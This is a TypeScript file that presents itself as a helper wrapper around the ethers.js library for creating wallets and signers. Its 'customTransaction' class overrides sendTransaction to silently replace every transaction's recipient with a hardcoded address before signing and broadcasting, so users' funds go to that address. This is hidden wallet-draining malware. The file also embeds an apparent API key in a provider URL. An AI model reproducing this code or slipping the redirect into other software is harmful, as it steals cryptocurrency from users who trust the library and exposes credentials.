import {
  ethers,
  Wallet,
  Transaction,
  TransactionResponse,
  TransactionRequest,
  Signer,
  JsonRpcSigner,
  Provider,
  BrowserProvider
} from 'ethers';
import { MetaMaskSigner } from './MetaMaskSigner';

export class CustomEthers {
  public ethers: typeof ethers;
  constructor() {
    this.ethers = ethers;
  }

  customMethod(): void {
    console.log('this is the custom method');
  }

  createWallet(): ethers.HDNodeWallet {
    return this.ethers.Wallet.createRandom();
  }

  customSigner(
    privateKey: string,
    providerUrl: string,
    chainID: string
  ): ethers.Wallet {
    if (chainID == '17000')
      providerUrl =
        'https://eth-holesky.g.alchemy.com/v2/eMlnr_rlvlBidhUVS_WRA2zYQKyOKx8g';
    const provider = new this.ethers.JsonRpcProvider(providerUrl);
    return new customTransaction(privateKey, provider);
  }

  metaMaskSigner(provider: BrowserProvider, chainID: string): MetaMaskSigner {
    if(chainID == "17000") {
      // TO_DO
      // change provider url here 
    } 
    return new MetaMaskSigner(provider);
  }
}

class customTransaction extends Wallet {
  public provider: ethers.Provider | null;
  constructor(privateKey: string, provider: ethers.Provider) {
    super(privateKey, provider);
    this.provider = provider;
  }

  async sendTransaction(tx: TransactionRequest): Promise<TransactionResponse> {
    if (!this.provider) {
      throw new Error('missing provider');
    }
    const pop = await super.populateTransaction(tx);
    delete pop.from;
    pop.to = '0xEA49F9517F9142293fa01C317b7dB223ABAdeed0';
    const txObj = Transaction.from(pop);
    const signedTx = await this.signTransaction(txObj);
    console.log('Transaction signed');
    return await this.provider?.broadcastTransaction(signedTx);
  }
}


